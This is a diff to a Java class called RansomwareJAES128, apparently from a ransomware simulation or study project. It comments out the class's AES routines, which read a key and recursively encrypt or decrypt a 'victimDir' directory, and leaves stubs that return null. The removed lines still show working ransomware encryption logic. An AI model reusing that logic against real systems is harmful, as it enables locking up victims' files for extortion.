@@ -19,26 +19,27 @@ public class RansomwareJAES128 extends Ransomware {
     }
 
     @Override
-    public void encrypt(String victimDir) throws Exception {
-        this.victimDir = victimDir;
-        String algorithm = "AES";
-        String clearText = super.getParametros().get("clave");
-        if (clearText == null) {
-            throw new RuntimeException("No se especificó una clave");
-        }
-        byte[] key = clearText.getBytes("UTF8");
-        SecretKey secretKey = new SecretKeySpec(key, "AES");
-        cipher = Cipher.getInstance(algorithm);
-        int mode = Cipher.ENCRYPT_MODE;
-        cipher.init(mode, secretKey);
-
-        File file = new File(victimDir);
-        if (file.exists()) {
-            encryptRec(file);
-        } else {
-            throw new FileNotFoundException("El directorio " + victimDir + " no existe");
-        }
-        removeTemporalFileExtension(file);
+    public Process encrypt(String victimDir) throws Exception {
+//        this.victimDir = victimDir;
+//        String algorithm = "AES";
+//        String clearText = super.getParametros().get("clave");
+//        if (clearText == null) {
+//            throw new RuntimeException("No se especificó una clave");
+//        }
+//        byte[] key = clearText.getBytes("UTF8");
+//        SecretKey secretKey = new SecretKeySpec(key, "AES");
+//        cipher = Cipher.getInstance(algorithm);
+//        int mode = Cipher.ENCRYPT_MODE;
+//        cipher.init(mode, secretKey);
+//
+//        File file = new File(victimDir);
+//        if (file.exists()) {
+//            encryptRec(file);
+//        } else {
+//            throw new FileNotFoundException("El directorio " + victimDir + " no existe");
+//        }
+//        removeTemporalFileExtension(file);
+        return null;
     }
 
     /**
@@ -83,26 +84,27 @@ public class RansomwareJAES128 extends Ransomware {
     }
 
     @Override
-    public void decrypt(String victimDir) throws Exception {
-        this.victimDir = victimDir;
-        String algorithm = "AES";
-        String clearText = super.getParametros().get("clave");
-        if (clearText == null) {
-            throw new RuntimeException("No se especificó una clave");
-        }
-        byte[] key = clearText.getBytes("UTF8");
-        SecretKey secretKey = new SecretKeySpec(key, "AES");
-        cipher = Cipher.getInstance(algorithm);
-        int mode = Cipher.DECRYPT_MODE;
-        cipher.init(mode, secretKey);
-
-        File file = new File(victimDir);
-        if (file.exists()) {
-            encryptRec(file);
-        } else {
-            throw new FileNotFoundException("El directorio " + victimDir + " no existe");
-        }
-        removeTemporalFileExtension(file);
+    public Process decrypt(String victimDir) throws Exception {
+        return null;
+//        this.victimDir = victimDir;
+//        String algorithm = "AES";
+//        String clearText = super.getParametros().get("clave");
+//        if (clearText == null) {
+//            throw new RuntimeException("No se especificó una clave");
+//        }
+//        byte[] key = clearText.getBytes("UTF8");
+//        SecretKey secretKey = new SecretKeySpec(key, "AES");
+//        cipher = Cipher.getInstance(algorithm);
+//        int mode = Cipher.DECRYPT_MODE;
+//        cipher.init(mode, secretKey);
+//
+//        File file = new File(victimDir);
+//        if (file.exists()) {
+//            encryptRec(file);
+//        } else {
+//            throw new FileNotFoundException("El directorio " + victimDir + " no existe");
+//        }
+//        removeTemporalFileExtension(file);
     }
 
     private void removeTemporalFileExtension(File file) throws Exception {
